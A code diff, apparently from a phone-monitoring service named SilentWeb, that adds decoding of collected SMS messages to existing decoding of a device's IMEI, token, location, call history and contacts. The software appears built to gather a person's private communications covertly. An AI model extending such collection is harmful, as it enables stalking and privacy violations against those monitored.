@@ -26,37 +26,49 @@ namespace SilentWeb.Services
             {
                 if (DataChecker.CheckAuthentication(bulkData.Authentication))
                 {
-                    bulkData.Authentication.IMEI = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.Authentication.IMEI)));
+                    bulkData.Authentication.IMEI = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Authentication.IMEI)));
                     bulkData.Authentication.SecToken = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.Authentication.SecToken)));
                 }
 
                 if (DataChecker.CheckLocation(bulkData.Location))
                 {
-                    bulkData.Location.Latitude = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.Location.Latitude)));
-                    bulkData.Location.Longitude = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.Location.Longitude)));
-                    bulkData.Location.Hash = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.Location.Hash)));
+                    bulkData.Location.Latitude = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Location.Latitude)));
+                    bulkData.Location.Longitude = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Location.Longitude)));
+                    bulkData.Location.Hash = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Location.Hash)));
                 }
 
                 if (DataChecker.CheckCalls(bulkData.CallHistory))
                 {
                     for (int i = 0; i < bulkData.CallHistory.Calls.Count; i++)
                     {
-                        bulkData.CallHistory.Calls[i].Date = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.CallHistory.Calls[i].Date)));
-                        bulkData.CallHistory.Calls[i].Direction = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.CallHistory.Calls[i].Direction)));
-                        bulkData.CallHistory.Calls[i].Duration = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.CallHistory.Calls[i].Duration)));
-                        bulkData.CallHistory.Calls[i].Number = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.CallHistory.Calls[i].Number)));
+                        bulkData.CallHistory.Calls[i].Date = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.CallHistory.Calls[i].Date)));
+                        bulkData.CallHistory.Calls[i].Direction = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.CallHistory.Calls[i].Direction)));
+                        bulkData.CallHistory.Calls[i].Duration = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.CallHistory.Calls[i].Duration)));
+                        bulkData.CallHistory.Calls[i].Number = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.CallHistory.Calls[i].Number)));
                     }
-                    bulkData.CallHistory.Hash = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.CallHistory.Hash)));
+                    bulkData.CallHistory.Hash = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.CallHistory.Hash)));
                 }
 
                 if (DataChecker.CheckContacts(bulkData.Contacts))
                 {
                     for (int i = 0; i < bulkData.Contacts.ContactList.Count; i++)
                     {
-                        bulkData.Contacts.ContactList[i].Name = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.Contacts.ContactList[i].Name)));
-                        bulkData.Contacts.ContactList[i].Number = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.Contacts.ContactList[i].Number)));
+                        bulkData.Contacts.ContactList[i].Name = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Contacts.ContactList[i].Name)));
+                        bulkData.Contacts.ContactList[i].Number = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Contacts.ContactList[i].Number)));
                     }
-                    bulkData.Contacts.Hash = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.Contacts.Hash)));
+                    bulkData.Contacts.Hash = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Contacts.Hash)));
+                }
+
+                if (DataChecker.CheckMessages(bulkData.Messages))
+                {
+                    for (int i = 0; i < bulkData.Messages.Messages.Count; i++)
+                    {
+                        bulkData.Messages.Messages[i].Address = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Messages.Messages[i].Address)));
+                        bulkData.Messages.Messages[i].State = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Messages.Messages[i].State)));
+                        bulkData.Messages.Messages[i].Date = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Messages.Messages[i].Date)));
+                        bulkData.Messages.Messages[i].Type = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Messages.Messages[i].Type)));
+                        bulkData.Messages.Messages[i].Body = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Messages.Messages[i].Body)));
+                    }
                 }
                 return bulkData;
             }
@@ -70,7 +82,8 @@ namespace SilentWeb.Services
 
         private static string MakeUrlUnsafe(string value)
         {
-            return value.Replace('-', '+').Replace('_', '/');
+            string newValue = value.Replace('-', '+').Replace('_', '/');
+            return newValue;
         }
     }
 }
